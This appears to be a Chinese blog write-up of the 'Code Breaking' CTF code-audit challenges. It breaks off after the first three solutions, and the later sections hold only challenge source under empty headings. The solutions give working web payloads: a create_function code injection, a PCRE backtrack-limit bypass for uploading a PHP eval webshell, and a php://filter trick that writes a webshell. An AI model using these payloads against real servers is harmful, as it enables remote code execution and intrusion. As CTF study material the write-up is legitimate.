---
title: Code Breaking Writeup
date: 2018-12-30 12:34:38
tags:
- 代码审计
- Writeup
abstract: 
phith0n 在代码审计知识星球两周年时发起的审计游戏。圈子内容质量很高，欢迎加入，一起学习~
---

## 1.easy - function

> PHP 函数利用技巧

```php
<?php
$action = $_GET['action'] ?? '';
$arg = $_GET['arg'] ?? '';

if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
    show_source(__FILE__);
} else {
    $action('', $arg);
}
```

环境：

- Apache 2.4.25
- PHP 7.2.12

#### 预备知识

**仔细看一下 `isD` 模式修饰符**

```
i  ==>  忽略大小写
s  ==>  点号匹配所有字符，包含换行符，未设置则不匹配换行符
D  ==>  模式中的 $ 仅仅匹配目标字符串的末尾（不匹配结尾的换行符）
```

**`create_function( string $args , string $code )` **

常规用法 [PHP create_function() 代码注入](https://blog.51cto.com/lovexm/1743442)

```php
// 可控点为第一个参数
create_function($_GET['code'], '');
-->
create_function('){phpinfo();{//', '') 
    
// 可控点为第二个参数
create_function('', $_GET['code']);
--> 
create_function('', '}phpinfo();//')
```

为什么可以直接拼接生效呢？我们先看看[源码 1858行](https://github.com/php/php-src/blob/PHP-7.2.1/Zend/zend_builtin_functions.c)

```c
#define LAMBDA_TEMP_FUNCNAME	"__lambda_func"
/* {{{ proto string create_function(string args, string code)
   Creates an anonymous function, and returns its name (funny, eh?) */
ZEND_FUNCTION(create_function) {
    zend_string *function_name;
	char *eval_code, *function_args, *function_code;
	size_t eval_code_length, function_args_len, function_code_len;
	int retval;
	char *eval_name;

	if (zend_parse_parameters(ZEND_NUM_ARGS(), "ss", &function_args, 
       &function_args_len, &function_code, &function_code_len) == FAILURE) {
		return;
	}

	eval_code = (char *) emalloc(sizeof("function " LAMBDA_TEMP_FUNCNAME)
			+function_args_len
			+2	/* for the args parentheses */
			+2	/* for the curly braces */
			+function_code_len);

// void * memcpy ( void * destination, const void * source, size_t num );
	eval_code_length = sizeof("function " LAMBDA_TEMP_FUNCNAME "(") - 1;
	memcpy(eval_code, "function " LAMBDA_TEMP_FUNCNAME "(", eval_code_length);
// 将 function_args 复制到 eval_code
	memcpy(eval_code + eval_code_length, function_args, function_args_len);
	eval_code_length += function_args_len;

	eval_code[eval_code_length++] = ')';
	eval_code[eval_code_length++] = '{';
// 到此，形成了 function " __lambda_func "(function_args) {

	memcpy(eval_code + eval_code_length, function_code, function_code_len);
	eval_code_length += function_code_len;

	eval_code[eval_code_length++] = '}';
	eval_code[eval_code_length] = '\0';

// function " __lambda_func "(function_args) { eval_code }\0
	eval_name = zend_make_compiled_string_description("runtime-created function");

// 重点在这里，总的来说，可以理解为 形成匿名函数后直接扔给了 eval()
// eval('function __lambda_func(' . $_GET['args']) . '){' . $_GET['code'] . '}\0');
    retval = zend_eval_stringl(eval_code, eval_code_length, NULL, eval_name);

// 以下有删减
}
```

再跟一下 `zend_eval_stringl()` [1047行](https://github.com/php/php-src/blob/PHP-7.2.1/Zend/zend_execute_API.c) 

```c
ZEND_API int zend_eval_stringl(char *str, size_t str_len, zval *retval_ptr, char *string_name) /* {{{ */
{
	zval pv;
	zend_op_array *new_op_array;
	uint32_t original_compiler_options;
	int retval;

	if (retval_ptr) {
		ZVAL_NEW_STR(&pv, zend_string_alloc(str_len + sizeof("return ;")-1, 1));
		memcpy(Z_STRVAL(pv), "return ", sizeof("return ") - 1);
		memcpy(Z_STRVAL(pv) + sizeof("return ") - 1, str, str_len);
		Z_STRVAL(pv)[Z_STRLEN(pv) - 1] = ';';
		Z_STRVAL(pv)[Z_STRLEN(pv)] = '\0';
	} else {
        // 把 pv 设置为 string 类型，值为 str
		ZVAL_STRINGL(&pv, str, str_len);
	}

	/*printf("Evaluating '%s'\n", pv.value.str.val);*/

	original_compiler_options = CG(compiler_options);
	CG(compiler_options) = ZEND_COMPILE_DEFAULT_FOR_EVAL;
    // 把 php 代码编译成 opcode
	new_op_array = zend_compile_string(&pv, string_name);
	CG(compiler_options) = original_compiler_options;

	if (new_op_array) {
		zval local_retval;

		EG(no_extensions)=1;

		new_op_array->scope = zend_get_executed_scope();

		zend_try {
			ZVAL_UNDEF(&local_retval);
            // 执行 opcode，把结果存储到 local_retval
			zend_execute(new_op_array, &local_retval);
		} zend_catch {
			destroy_op_array(new_op_array);
			efree_size(new_op_array, sizeof(zend_op_array));
			zend_bailout();
		} zend_end_try();

		if (Z_TYPE(local_retval) != IS_UNDEF) {
			if (retval_ptr) {
				ZVAL_COPY_VALUE(retval_ptr, &local_retval);
			} else {
				zval_ptr_dtor(&local_retval);
			}
		} else {
			if (retval_ptr) {
				ZVAL_NULL(retval_ptr);
			}
		}

		EG(no_extensions)=0;
		destroy_op_array(new_op_array);
		efree_size(new_op_array, sizeof(zend_op_array));
		retval = SUCCESS;
	} else {
		retval = FAILURE;
	}
	zval_dtor(&pv);
	return retval;
}
```

**全局空间**

>(PHP 5 >= 5.3.0, PHP 7)
>
>如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间，与 PHP 引入命名空间概念前一样。在名称前加上前缀 `\` 表示该名称是全局空间中的名称，即使该名称位于其它的命名空间中时也是如此。

Example

```php
<?php
namespace A\B\C;
/* 这个函数是 A\B\C\fopen */
function fopen() {      
    /* ... */
    $f = \fopen(...); // 调用全局的fopen函数     
    return $f;} 
 
namespace ccc;
\eval($_REQUEST['a']);
```



#### 目标

利用 `$action('', $arg)` 构造远程代码执行，这里使用 `create_function()`



#### 阻碍

`$action` 中不能全是字母、数字以及下划线，无法直接调用 `create_function()`



#### 解决方法


为了不影响 `create_function` 调用，只能在前面或者后面插入一个无法被正则匹配到的字符。直接 fuzz 一波 ASCII 码，从 `%00 ~ %ff` 可得到 %5c 即 `\`。

先试一下 `phpinfo`

```php
%5ccreate_function&arg=}phpinfo();//
```

![屏幕捕获_2019_03_03_20_11_09_363](C:\Users\wywwzjj\Documents\oCam\屏幕捕获_2019_03_03_20_11_09_363.png)

**然后找 `flag`**

看一下 **disable_functions**

```php
system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,
mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log
```

那直接用 php 的文件操作函数

```php
/?action=\create_function&arg=}print_r(scandir(dirname(__FILE__)."/../"));//

var_dump(glob("/var/www/*"));  // 也可以
```

![屏幕捕获_2019_03_03_20_24_07_84](C:\Users\wywwzjj\Documents\oCam\屏幕捕获_2019_03_03_20_24_07_84.png)

查看 flag
```php
&arg=}print_r(file_get_contents('../flag_h0w2execute_arb1trary_c0de'));//
```

![屏幕捕获_2019_03_03_20_26_02_799](C:\Users\wywwzjj\Documents\oCam\屏幕捕获_2019_03_03_20_26_02_799.png)



## 2.easy - pcrewaf

> PHP 正则特性

```php
<?php
function is_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
} 
```

#### 目标

写入一句话后门。



#### 阻碍

正则匹配式waf，不能写入 `<?` 等必要的符号。`<script language="php">` 在低版本里或许可以试试，然而 PHP7 已经不支持这个标签了。



#### 解决方法

这有一类似的题 [萌萌哒的报名系统](https://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F)

```php
preg_match('/^(xdsec)((?:###|\w)+)$/i', $code, $matches);
```

> 其实正解是通过pre_match函数的资源消耗来绕过，因为pre_match在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，所以通过喂一个超长的字符串去给pre_match吃，导致pre_match消耗大量资源从而导致php超时，后面的php语句就不会执行。

ph 师傅也单独写了一篇文章讲这个问题 [PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)


**回溯超过一百万次，返回 false**  [具体回溯过程](https://regex101.com/r/1ecWok/1/debugger)

![屏幕捕获_2019_03_10_17_27_06_882](C:\Users\wywwzjj\Documents\oCam\屏幕捕获_2019_03_10_17_27_06_882.png)

**payload**

```php
<?php eval($_GET[1]);// a*1000000
```



## 3.easy - phpmagic

> PHP 写文件技巧

```php
<?php
if(isset($_GET['read-source'])) {
    exit(show_source(__FILE__));
}

define('DATA_DIR', dirname(__FILE__) . '/data/' . md5($_SERVER['REMOTE_ADDR']));

if(!is_dir(DATA_DIR)) {
    mkdir(DATA_DIR, 0755, true);
}

chdir(DATA_DIR);  // 改变当前目录为 DATA_DIR

$domain = isset($_POST['domain']) ? $_POST['domain'] : '';
$log_name = isset($_POST['log']) ? $_POST['log'] : date('-Y-m-d');
?>

<?php 
if(!empty($_POST) && $domain):
    $command = sprintf("dig -t A -q %s", escapeshellarg($domain));
    $output = shell_exec($command);
    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);

    $log_name = $_SERVER['SERVER_NAME'] . $log_name;
    if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), 
      ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) {
        file_put_contents($log_name, $output);
    }
    echo $output;
endif; 
?>
```

#### 预备知识



#### 目标



#### 阻碍



#### 解决方法

注意到有个 `escapeshellarg($domain)`，功能如下： 

1.确保用户只传递一个参数给命令
2.用户不能指定更多的参数一个
3.用户不能执行不同的命令

[利用/绕过 PHP escapeshellarg/escapeshellcmd函数](https://www.anquanke.com/post/id/107336)

`htmlspecialchars()`

- ENT_HTML401 - 默认。作为 HTML 4.01 处理代码。

- ENT_QUOTES - 编码双引号和单引号。

对于前头这些字符串

```
; &lt;&lt;&gt;&gt; DiG 9.9.5-9+deb8u15-Debian &lt;&lt;&gt;&gt; -t A -q
```

符合base64规范的字符是：

```
ltltgtgtDiG9959deb8u15DebianltltgtgttAq 
```

恰好是40位，为4的倍数，就不用管这个，只需要添加我们的字符串。因为插入的字符在中间，所以不能有 `=`

```php
POST / HTTP/1.1
Host: php
Upgrade-Insecure-Requests: 1

domain=PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg&log=://filter/write=convert.base64-decode/resource=shell.php/.
```

成功写入一句话

```php
<?php eval($_GET['c']);?>
```



## 4.easy - phplimit

> PHP 代码执行限制绕过

```php
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {   
    eval($_GET['code']);
} else {
    show_source(__FILE__);
}
```

#### 预备知识



#### 目标



#### 阻碍



#### 解决方法

## 5.easy - nodechr

> JavaScript 字符串特性

```javascript
// initial libraries
const Koa = require('koa')
const sqlite = require('sqlite')
const fs = require('fs')
const views = require('koa-views')
const Router = require('koa-router')
const send = require('koa-send')
const bodyParser = require('koa-bodyparser')
const session = require('koa-session')
const isString = require('underscore').isString
const basename = require('path').basename

const config = JSON.parse(fs.readFileSync('../config.json', {encoding: 'utf-8', flag: 'r'}))

async function main() {
    const app = new Koa()
    const router = new Router()
    const db = await sqlite.open(':memory:')

    await db.exec(`CREATE TABLE "main"."users" (
        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
        "username" TEXT NOT NULL,
        "password" TEXT,
        CONSTRAINT "unique_username" UNIQUE ("username")
    )`)
    await db.exec(`CREATE TABLE "main"."flags" (
        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
        "flag" TEXT NOT NULL
    )`)
    for (let user of config.users) {
        await db.run(`INSERT INTO "users"("username", "password") VALUES ('${user.username}', '${user.password}')`)
    }
    await db.run(`INSERT INTO "flags"("flag") VALUES ('${config.flag}')`)

    router.all('login', '/login/', login).get('admin', '/', admin).get('static', '/static/:path(.+)', static).get('/source', source)

    app.use(views(__dirname + '/views', {
        map: {
            html: 'underscore'
        },
        extension: 'html'
    })).use(bodyParser()).use(session(app))
    
    app.use(router.routes()).use(router.allowedMethods());
    
    app.keys = config.signed
    app.context.db = db
    app.context.router = router
    app.listen(3000)
}

function safeKeyword(keyword) {
    if(isString(keyword) && !keyword.match(/(union|select|;|\-\-)/is)) {
        return keyword
    }

    return undefined
}

async function login(ctx, next) {
    if(ctx.method == 'POST') {
        let username = safeKeyword(ctx.request.body['username'])
        let password = safeKeyword(ctx.request.body['password'])

        let jump = ctx.router.url('login')
        if (username && password) {
            let user = await ctx.db.get(`SELECT * FROM "users" WHERE "username" = '${username.toUpperCase()}' AND "password" = '${password.toUpperCase()}'`)

            if (user) {
                ctx.session.user = user

                jump = ctx.router.url('admin')
            }

        }

        ctx.status = 303
        ctx.redirect(jump)
    } else {
        await ctx.render('index')
    }
}

async function static(ctx, next) {
    await send(ctx, ctx.path)
}

async function admin(ctx, next) {
    if(!ctx.session.user) {
        ctx.status = 303
        return ctx.redirect(ctx.router.url('login'))
    }

    await ctx.render('admin', {
        'user': ctx.session.user
    })
}

async function source(ctx, next) {
    await send(ctx, basename(__filename))
}

main()
```

#### 预备知识



#### 目标



#### 阻碍



#### 解决方法

## 6.medium - javacon

> SPEL 表达式沙盒绕过

#### 预备知识



#### 目标



#### 阻碍



#### 解决方法



## 7.medium - lumenserial

> 反序列化在 7.2 下的利用

#### 预备知识



#### 目标



#### 阻碍



#### 解决方法



## 8.hard - picklecode

> Python 反序列化沙盒绕过

#### 预备知识



#### 目标



#### 阻碍



#### 解决方法



## 9.hard - thejs

> JavaScript 对象特性利用

```javascript
const fs = require('fs')
const express = require('express')
const bodyParser = require('body-parser')
const lodash = require('lodash')
const session = require('express-session')
const randomize = require('randomatic')

const app = express()
app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json()) //对post请求的请求体进行解析
app.use('/static', express.static('static'))
app.use(session({
    name: 'thejs.session',
    secret: randomize('aA0', 16), // 随机数
    resave: false,
    saveUninitialized: false
}))
app.engine('ejs', function (filePath, options, callback) { // 模板引擎
    fs.readFile(filePath, (err, content) => {   //读文件 filepath
        if (err) return callback(new Error(err))
        let compiled = lodash.template(content)  //模板化
        let rendered = compiled({...options})   //动态引入变量

        return callback(null, rendered)
    })
})
app.set('views', './views')
app.set('view engine', 'ejs')

app.all('/', (req, res) => {
    let data = req.session.data || {language: [], category: []}
    if (req.method == 'POST') {
        data = lodash.merge(data, req.body) // merge 合并字典
        req.session.data = data
    }

    res.render('index', {
        language: data.language, 
        category: data.category
    })
})

app.listen(3000, () => console.log(`Example app listening on port 3000!`))
```



#### 预备知识



#### 目标



#### 阻碍



#### 解决方法